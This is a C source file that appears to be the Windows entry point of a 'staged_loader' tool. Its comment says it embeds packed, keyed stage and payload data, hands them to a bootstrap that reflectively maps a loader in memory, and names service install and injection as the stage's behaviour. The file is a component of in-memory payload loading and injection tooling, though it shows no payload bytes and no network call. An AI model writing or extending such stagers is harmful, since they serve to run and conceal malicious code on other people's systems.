/*
 * staged_loader stager host (Windows exe).
 *
 * The on-disk executable embeds the packed artifacts via stage_data.S (see
 * stage_data.h). It hands them, plus its own command line, to the shared
 * staged_loader_bootstrap(), which reflectively maps the real loader and calls
 * its StageMain. All behaviour (service dispatch, CLI, injection) lives in
 * the stage, so this file is only the exe entry point.
 *
 * Built as `service` it includes the service dispatcher/install commands;
 * built as `exe` (STAGED_LOADER_NO_SERVICE) it is a plain one-shot launcher.
 */
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#ifndef WINVER
#define WINVER 0x0601
#endif
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif
#include <windows.h>
#include <shellapi.h>

#include "bootstrap.h"
#include "stage_data.h"

int main(void) {
  LPWSTR *argv = NULL;
  int argc = 0;
  int ret;

  argv = CommandLineToArgvW(GetCommandLineW(), &argc);
  if (argv == NULL) {
    return 1;
  }

  ret = staged_loader_bootstrap(
      staged_loader_stage_start, (size_t)(staged_loader_stage_end - staged_loader_stage_start),
      staged_loader_stage_key_start, (size_t)(staged_loader_stage_key_end - staged_loader_stage_key_start),
      staged_loader_payload_start, (size_t)(staged_loader_payload_end - staged_loader_payload_start),
      staged_loader_key_start, (size_t)(staged_loader_key_end - staged_loader_key_start), argc, argv);

  LocalFree(argv);
  return ret;
}
